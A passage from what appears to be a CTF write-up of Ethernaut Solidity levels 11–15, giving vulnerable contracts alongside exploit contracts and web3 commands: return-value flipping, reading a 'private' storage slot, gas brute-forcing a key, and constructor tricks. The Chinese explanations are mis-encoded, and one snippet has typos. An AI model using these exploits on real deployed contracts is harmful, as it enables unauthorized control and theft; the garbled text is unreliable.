</span></span></code></pre></td></tr></table>
</div>
</div><p>Level completed.</p>
<h2 id="11-elevator">11. Elevator</h2>
<p>ç›®æ¨™ <code>top = true</code></p>
<p>éœ€è¦è‡ªå·±å¯¦ä½œ <code>isLastFloor()</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: MIT
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">6</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">interface</span> <span class="nc">Building</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kd">function</span> <span class="nf">isLastFloor</span><span class="p">(</span><span class="kt">uint</span><span class="p">)</span> <span class="k">external</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">Elevator</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">bool</span> <span class="k">public</span> <span class="n">top</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">uint</span> <span class="k">public</span> <span class="n">floor</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="kd">function</span> <span class="nf">goTo</span><span class="p">(</span><span class="kt">uint</span> <span class="n">_floor</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">Building</span> <span class="n">building</span> <span class="o">=</span> <span class="n">Building</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span> <span class="n">building</span><span class="p">.</span><span class="n">isLastFloor</span><span class="p">(</span><span class="n">_floor</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">floor</span> <span class="o">=</span> <span class="n">_floor</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">top</span> <span class="o">=</span> <span class="n">building</span><span class="p">.</span><span class="n">isLastFloor</span><span class="p">(</span><span class="n">floor</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç¬¬ä¸€æ¬¡å‘¼å« isLastFloor() éœ€å›å‚³ false(line 15)ï¼Œç¬¬äºŒæ¬¡éœ€å›å‚³ true(line 17)</p>
<h3 id="exploit-10">Exploit</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: MIT
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">6</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">interface</span> <span class="nc">IElevator</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">goTo</span><span class="p">(</span><span class="kt">uint</span> <span class="n">_floor</span><span class="p">)</span> <span class="k">external</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">ElevatorAttack</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">bool</span> <span class="k">public</span> <span class="n">isLast</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">  <span class="kd">function</span> <span class="nf">isLastFloor</span><span class="p">(</span><span class="kt">uint</span><span class="p">)</span> <span class="k">public</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">isLast</span> <span class="o">=</span> <span class="o">!</span> <span class="n">isLast</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">isLast</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="kd">function</span> <span class="nf">attack</span><span class="p">(</span><span class="kt">address</span> <span class="n">_victim</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">IElevator</span><span class="p">(</span><span class="n">_victim</span><span class="p">).</span><span class="n">goTo</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Level completed.</p>
<h2 id="12-privacy">12. Privacy</h2>
<p>ç›®æ¨™ <code>locked = false</code></p>
<p>å¾—çŸ¥é“ bytes16(data[2]) æ˜¯ä»€éº¼</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl">  <span class="kd">function</span> <span class="nf">unlock</span><span class="p">(</span><span class="kt">bytes16</span> <span class="n">_key</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nb">require</span><span class="p">(</span><span class="n">_key</span> <span class="o">==</span> <span class="kt">bytes16</span><span class="p">(</span><span class="nb">data</span><span class="p">[</span><span class="mi">2</span><span class="p">]));</span>
</span></span><span class="line"><span class="cl">    <span class="n">locked</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>çœ‹ä¸€ä¸‹ storage çš„ç‹€æ³ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">slot 0: bool
</span></span><span class="line"><span class="cl">slot 1: ID
</span></span><span class="line"><span class="cl">slot 2: awkwardness | denomination | flattening
</span></span><span class="line"><span class="cl">slot 3: data[0]
</span></span><span class="line"><span class="cl">slot 4: data[1]
</span></span><span class="line"><span class="cl">slot 5: data[2]
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="exploit-11">Exploit</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">key</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">getStorageAt</span><span class="p">(</span><span class="nx">contract</span><span class="p">.</span><span class="nx">address</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">// Output: &#39;0x5dd89f7b81030395311dd63330c747fe293140d92dbe7eee1df2a8c233ef8d6d&#39;
</span></span></span><span class="line"><span class="cl"><span class="c1">// å– bytes16ï¼Œè¨˜å¾—åŠ ä¸Š 0xï¼Œæ‰€ä»¥æ˜¯ 34
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">key</span> <span class="o">=</span> <span class="nx">key</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">34</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">// Output: 0x5dd89f7b81030395311dd63330c747fe
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kr">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">unlock</span><span class="p">(</span><span class="nx">key</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Level completed.</p>
<h2 id="13-gatekeeper-one">13. Gatekeeper One</h2>
<p>ç›®æ¨™ <code>entrant = player</code></p>
<h3 id="gateone">gateOne</h3>
<p>åŒ 4.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl">  <span class="kd">modifier</span> <span class="nf">gateOne</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nb">require</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span> <span class="o">!=</span> <span class="nb">tx</span><span class="p">.</span><span class="nb">origin</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">_</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="gatetwo">gateTwo</h3>
<p>gasleft å¾—è¢« 8191 æ•´é™¤</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl">  <span class="kd">modifier</span> <span class="nf">gateTwo</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nb">require</span><span class="p">(</span><span class="nb">gasleft</span><span class="p">().</span><span class="n">mod</span><span class="p">(</span><span class="mi">8191</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">_</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å¯ä»¥æœ¬åœ°è·‘çœ‹çœ‹ä¼°ç®—å¤§æ¦‚å¤šå°‘ gasï¼Œæå€‹ for åœ¨æŸå€‹å€é–“è©¦è©¦çœ‹</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">GateKeeperOneGasEstimate</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">enterGate</span><span class="p">(</span><span class="kt">address</span> <span class="n">_gateAddr</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">_gas</span><span class="p">)</span> <span class="k">public</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kt">bytes8</span> <span class="n">gateKey</span> <span class="o">=</span> <span class="kt">bytes8</span><span class="p">(</span><span class="kt">uint64</span><span class="p">(</span><span class="nb">tx</span><span class="p">.</span><span class="nb">origin</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="n">unit</span> <span class="n">i</span> <span class="o">=</span> <span class="n">_gas</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">_gas</span> <span class="o">+</span> <span class="mi">8191</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="p">(</span><span class="kt">bool</span> <span class="n">success</span><span class="p">,</span> <span class="p">)</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="n">_gateAddr</span><span class="p">).</span><span class="nb">call</span><span class="p">.</span><span class="nb">gas</span><span class="p">(</span><span class="n">_gas</span><span class="p">)(</span><span class="nb">abi</span><span class="p">.</span><span class="nb">encodeWithSignature</span><span class="p">(</span><span class="s">&#34;enter(bytes8)&#34;</span><span class="p">,</span> <span class="n">gateKey</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">success</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">success</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="gatethree">gateThree</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl">  <span class="kd">modifier</span> <span class="nf">gateThree</span><span class="p">(</span><span class="kt">bytes8</span> <span class="n">_gateKey</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nb">require</span><span class="p">(</span><span class="kt">uint32</span><span class="p">(</span><span class="kt">uint64</span><span class="p">(</span><span class="n">_gateKey</span><span class="p">))</span> <span class="o">==</span> <span class="kt">uint16</span><span class="p">(</span><span class="kt">uint64</span><span class="p">(</span><span class="n">_gateKey</span><span class="p">)),</span> <span class="s">&#34;GatekeeperOne: invalid gateThree part one&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nb">require</span><span class="p">(</span><span class="kt">uint32</span><span class="p">(</span><span class="kt">uint64</span><span class="p">(</span><span class="n">_gateKey</span><span class="p">))</span> <span class="o">!=</span> <span class="kt">uint64</span><span class="p">(</span><span class="n">_gateKey</span><span class="p">),</span> <span class="s">&#34;GatekeeperOne: invalid gateThree part two&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nb">require</span><span class="p">(</span><span class="kt">uint32</span><span class="p">(</span><span class="kt">uint64</span><span class="p">(</span><span class="n">_gateKey</span><span class="p">))</span> <span class="o">==</span> <span class="kt">uint16</span><span class="p">(</span><span class="nb">tx</span><span class="p">.</span><span class="nb">origin</span><span class="p">),</span> <span class="s">&#34;GatekeeperOne: invalid gateThree part three&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">_</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>èˆ‰ä¾‹ player = 0xac32124edDcE61fFa17167a9c449aDc38fc8AEF4</p>
<p>å…ˆçœ‹ line 4: <code>uint32(uint64(_gateKey)) == uint16(tx.origin)</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">uint32(uint64(key)) = 8f c8 AE F4
</span></span><span class="line"><span class="cl">uint16(tx.origin) = AE F4
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">8f c8 AE F4 &amp; 00 00 FF FF = 00 00 AE F4
</span></span></code></pre></td></tr></table>
</div>
</div><p>line 3: <code>uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">8f c8 AE F4 == AE F4
</span></span><span class="line"><span class="cl">8f c8 AE F4 &amp; 00 00 FF FF = 00 00 AE F4
</span></span></code></pre></td></tr></table>
</div>
</div><p>line 2: <code>uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">8f c8 AE F4 != c4 49 aD c3 8f c8 AE F4
</span></span><span class="line"><span class="cl">c4 49 aD c3 8f c8 AE F4 &amp; FF FF FF FF 00 00 FF FF = c4 49 aD c3 00 00 AE F4
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="exploit-12">Exploit</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">Gate</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">enterGate</span><span class="p">(</span><span class="kt">address</span> <span class="n">_gateAddr</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">_gas</span><span class="p">)</span> <span class="k">public</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kt">bytes8</span> <span class="n">key</span> <span class="o">=</span> <span class="kt">bytes8</span><span class="p">(</span><span class="kt">uint64</span><span class="p">(</span><span class="nb">tx</span><span class="p">.</span><span class="nb">origin</span><span class="p">))</span> <span class="o">&amp;</span> <span class="mh">0xffffffff0000ffff</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="kt">bool</span> <span class="n">succeeded</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="kt">uint</span> <span class="n">i</span> <span class="o">=</span> <span class="n">_gas</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">_gas</span> <span class="o">+</span> <span class="mi">8191</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="p">(</span><span class="kt">bool</span> <span class="n">success</span><span class="p">,</span> <span class="p">)</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="n">_gateAddr</span><span class="p">).</span><span class="nb">call</span><span class="p">.</span><span class="nb">gas</span><span class="p">(</span><span class="n">i</span><span class="p">)(</span><span class="nb">abi</span><span class="p">.</span><span class="nb">encodeWithSignature</span><span class="p">(</span><span class="s">&#34;enter(bytes8)&#34;</span><span class="p">,</span> <span class="n">key</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">          <span class="k">if</span> <span class="p">(</span><span class="n">success</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">succeeded</span> <span class="o">=</span> <span class="n">success</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">          <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">succeeded</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="14-gatekeeper-two">14. Gatekeeper Two</h2>
<p>ç›®æ¨™ <code>entrant = player</code></p>
<h3 id="gateone-1">gateOne</h3>
<p>åŒ 4.</p>
<h3 id="gatetwo-1">gateTwo</h3>
<p>extcodesize(a)ï¼š å–å¾—ä½æ–¼åœ°å€ a çš„ç¨‹å¼ç¢¼å¤§å°</p>
<ul>
<li>å°çŸ¥è­˜ï¼šåœ¨ constructor å»èª¿ç”¨æ™‚ï¼Œ extcodesize(a) æœƒå›å‚³ 0ï¼Œå› ç‚ºå°šæœªå®Œæˆéƒ¨ç½²</li>
</ul>
<h3 id="gatethree-1">gateThree</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl">  <span class="kd">modifier</span> <span class="nf">gateThree</span><span class="p">(</span><span class="kt">bytes8</span> <span class="n">_gateKey</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nb">require</span><span class="p">(</span><span class="kt">uint64</span><span class="p">(</span><span class="kt">bytes8</span><span class="p">(</span><span class="nb">keccak256</span><span class="p">(</span><span class="nb">abi</span><span class="p">.</span><span class="nb">encodePacked</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">))))</span> <span class="o">^</span> <span class="kt">uint64</span><span class="p">(</span><span class="n">_gateKey</span><span class="p">)</span> <span class="o">==</span> <span class="kt">uint64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">_</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>If (X ^ Y = Z) =&gt; (Y = X ^ Z)</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="n">_gatekey</span> <span class="o">=</span> <span class="kt">bytes8</span><span class="p">(</span><span class="kt">uint64</span><span class="p">(</span><span class="kt">bytes8</span><span class="p">(</span><span class="nb">keccak256</span><span class="p">(</span><span class="nb">abi</span><span class="p">.</span><span class="nb">encodePacked</span><span class="p">(</span><span class="nb">this</span><span class="p">))))</span> <span class="o">^</span> <span class="kt">uint64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="exploit-13">Exploit</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: MIT
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">6</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">interface</span> <span class="nc">GatekeeperTwoInterface</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kd">function</span> <span class="nf">enter</span><span class="p">(</span><span class="kt">bytes8</span> <span class="n">_gateKey</span><span class="p">)</span> <span class="k">external</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">GatekeeperTwoAttack</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="n">GatekeeperTwoInterface</span> <span class="n">gatekeeper</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="kd">constructor</span><span class="p">(</span><span class="kt">address</span> <span class="n">GatekeeperTwoContractAddress</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">gatekeeper</span> <span class="o">=</span> <span class="n">GatekeeperTwoInterface</span><span class="p">(</span><span class="n">GatekeeperTwoContractAddress</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">bytes8</span> <span class="n">key</span> <span class="o">=</span> <span class="kt">bytes8</span><span class="p">(</span><span class="kt">uint64</span><span class="p">(</span><span class="kt">bytes8</span><span class="p">(</span><span class="nb">keccak256</span><span class="p">(</span><span class="nb">abi</span><span class="p">.</span><span class="nb">encodePacked</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">)))))</span> <span class="o">^</span> <span class="kt">uint64</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="n">gatekeeper</span><span class="p">.</span><span class="n">enter</span><span class="p">(</span><span class="n">key</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="15-naught-coin">15. Naught Coin</h2>
<p>ç›®æ¨™ <code>balanceOf(player) = 0</code></p>
<p>Transfer æœ‰å€‹ 10 å¹´çš„ lock period</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
